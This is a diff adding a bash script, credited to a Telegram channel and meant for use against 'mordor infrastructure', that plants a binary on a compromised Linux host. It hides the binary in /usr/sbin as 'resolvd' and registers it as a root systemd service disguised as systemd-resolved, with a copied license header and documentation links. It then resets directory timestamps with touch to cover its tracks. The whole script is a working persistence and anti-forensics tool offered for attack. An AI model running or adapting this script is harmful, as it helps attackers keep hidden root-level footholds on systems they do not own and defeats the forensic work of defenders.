@@ -1,0 +1,214 @@
+#!/bin/bash
+# This script wraps your binary in systemd unitfile
+# Made by https://t.me/cyber_shmel
+# Feel free to improve, modify and use against mordor infrastructure
+
+#set -euo pipefail
+#set -x
+
+BLUE='\033[0;34m'
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+NC='\033[0m'      # No Color
+
+INFO="${BLUE}[*]${NC}"
+FAIL="${RED}[-]${NC}"
+OK="${GREEN}[+]${NC}"
+
+TMP_DIR="$(mktemp -d)"
+TIME_FILE="${TMP_DIR}/unixtime"
+
+############################################### CONFIG ME!!!!!
+FRIENDLY_BIN='/tmp/some.elf'
+SYSTEMD_NAME='resolvd'
+HIDDEN_BIN_DIR='/usr/sbin'
+
+msg_ok(){
+  echo -e "${OK} ${1}"
+}
+
+msg_info(){
+  echo -e "${INFO} ${1}"
+}
+
+msg_fail(){
+  echo -e "${FAIL} ${1}"
+}
+
+check_dep(){
+  local bin="$1"
+
+  if which ${bin} 2>&1 >/dev/null; then
+    msg_ok "Located \t${bin}"
+  else
+    msg_fail "Can't find \t${bin}"
+    exit 1;
+  fi
+}
+
+check_btime(){
+  local btime=$(stat --printf="%W" /tmp) # %W btime
+
+  if [[ $btime == '0' ]]; then
+    msg_ok 'btime is 0'
+  else
+    msg_fail 'btime is not 0 :(' # I don't know how to set btime
+  fi
+}
+
+time_save(){
+  local path="$1"
+
+  if stat --printf="%X %Y %Z %n\n" $path >> $TIME_FILE; then
+    msg_ok "Saved time for ${path}"
+  else
+    msg_fail 'Impossible to save time, call doctor who!'
+    exit 1;
+  fi
+}
+
+# stat return unixtime, touch uses 201201010101
+unix_to_date(){
+  date +'%Y%m%d%H%M' -d "@${1}"
+}
+
+# %X     atime
+# %Y     mtime
+# %Z     ctime
+time_restore(){
+  local rootfs=$(where_am_i)
+
+  while read -r line; do
+    read atime mtime ctime filename <<< "$(echo $line)"
+
+    # atime=$(unix_to_date "${atime}")
+    # ctime=$(unix_to_date "${ctime}")
+    mtime=$(unix_to_date "${mtime}")
+
+    # FUCK THIS SHIT I HATE DEBUGFS
+    # debugfs -w -R "set_inode_field ${filename} atime ${atime}" $rootfs &> /dev/null
+    # debugfs -w -R "set_inode_field ${filename} mtime ${mtime}" $rootfs &> /dev/null
+    # debugfs -w -R "set_inode_field ${filename} ctime ${ctime}" $rootfs &> /dev/null
+    # sleep 5
+    # echo 2 > /proc/sys/vm/drop_caches
+    # sleep 5
+
+    # touch -t ; because who the fuck check ctime ?
+    touch -t "${mtime}" ${filename}
+
+    current_mtime=$(stat --printf="%Y" ${filename})
+    current_mtime=$(unix_to_date "${current_mtime}")
+    msg_info "current: ${current_mtime} desired: ${mtime} \t ${filename}"
+  done < ${TIME_FILE}
+
+  echo 2 > /proc/sys/vm/drop_caches
+}
+
+where_am_i(){
+  cat /proc/mounts | grep ' / ' | cut -d ' ' -f1
+}
+
+hide_bin(){
+  local src="$1"
+  local dst="$2"
+
+  msg_info "Hiding FRIENDLY_BIN: ${src} in ${dst}"
+
+  if mv "${src}" "${dst}"; then
+    chmod 755 $dst
+    msg_ok 'Bomb has been planted'
+  else
+    msg_fail "Failed to hide FRIENDLY_BIN: ${src} in ${dst}"
+    exit 1;
+  fi
+}
+
+create_unit(){
+  local path="$1"
+  local name="$2"
+
+# All my homies hate indentation (c) EOF
+cat > /lib/systemd/system/${name}.service << EOF
+#  SPDX-License-Identifier: LGPL-2.1+
+#
+#  This file is part of systemd.
+#
+#  systemd is free software; you can redistribute it and/or modify it
+#  under the terms of the GNU Lesser General Public License as published by
+#  the Free Software Foundation; either version 2.1 of the License, or
+#  (at your option) any later version.
+
+[Unit]
+Description=Network Name Resolution
+Documentation=man:systemd-resolved.service(8)
+Documentation=https://www.freedesktop.org/wiki/Software/systemd/resolved
+Documentation=https://www.freedesktop.org/wiki/Software/systemd/writing-network-configuration-managers
+Documentation=https://www.freedesktop.org/wiki/Software/systemd/writing-resolver-clients
+After=network.target
+
+[Service]
+ExecStart=${path}/${name}
+Restart=always
+RestartSec=120
+User=root
+EOF
+# Write your own unit file if needed
+# https://www.freedesktop.org/software/systemd/man/systemd.service.html
+
+
+
+  systemctl daemon-reload &> /dev/null
+  systemctl enable $name  &> /dev/null
+  systemctl start $name   &> /dev/null
+  systemctl status $name
+}
+
+# MAIN #############################################################################################
+
+msg_info 'Some info for ya:'
+msg_info "\t FRIENDLY_BIN      ${FRIENDLY_BIN}"
+msg_info "\t SYSTEMD_NAME  ${SYSTEMD_NAME}"
+
+msg_info '-=== Check dependencies ===-'
+
+check_dep systemctl
+check_dep debugfs
+check_dep stat
+
+# This part now completely useless, because i can't change ctime with debugfs
+# msg_info '-=== Check stuff ===-'
+
+# check_btime
+# msg_info "rootfs is on $(where_am_i)"
+
+msg_info '-=== Saving time ===-'
+
+time_save '/lib/systemd/system'
+time_save '/lib/systemd'
+time_save "${HIDDEN_BIN_DIR}"
+
+## Fuck this
+var1=$(cat ${TIME_FILE} | grep ${HIDDEN_BIN_DIR})
+var2=$(cat ${TIME_FILE} | grep "/lib/systemd/system")
+
+echo "${var1}/${SYSTEMD_NAME}" >> ${TIME_FILE}
+echo "${var2}/${SYSTEMD_NAME}.service" >> ${TIME_FILE}
+
+msg_info '-=== Hiding binary ===-'
+
+hide_bin "${FRIENDLY_BIN}" "${HIDDEN_BIN_DIR}/${SYSTEMD_NAME}"
+
+msg_info '-=== Setup systemd stuff ===-'
+
+create_unit "${HIDDEN_BIN_DIR}" "${SYSTEMD_NAME}"
+
+msg_info '-=== Time distortion magic ===-'
+
+msg_info 'Sync and sleep'
+
+time_restore
+
+msg_info '-=== Remove temp folder ===-'
+
+rm -rf $TMP_DIR
+msg_ok 'All done! sub2 https://t.me/cyber_shmel'
